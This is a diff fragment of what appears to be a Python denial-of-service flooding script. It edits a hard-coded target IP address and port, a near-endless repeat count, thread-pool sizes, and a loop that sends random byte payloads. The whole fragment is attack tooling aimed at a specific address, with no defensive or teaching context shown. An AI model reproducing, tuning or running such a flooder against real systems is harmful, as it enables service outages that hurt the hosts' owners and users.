@@ -7,9 +7,8 @@ from multiprocessing.dummy import Pool as ThreadPool
 
 
 
-#ip = '82.200.161.178'
-ip = '101.71.138.0'
-port = 123
+ip = '82.200.161.178'
+port = 80
 choice = '1'
 times = 10000000000
 threads = 10
@@ -27,7 +26,7 @@ def run(a):
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(16*1000000)
+	data = random._urandom(16*10)
 	i = random.choice(("[+]","-","[*]"))
 	while True:
 		try:
@@ -52,7 +51,7 @@ def run3():
 
 for y in range(threads):
 	if choice == '1':
-		pool = ThreadPool(100)
+		pool = ThreadPool(3)
 		results = pool.map(run,[i for i in range(10000)])
 		pool.close()
 		pool.join()
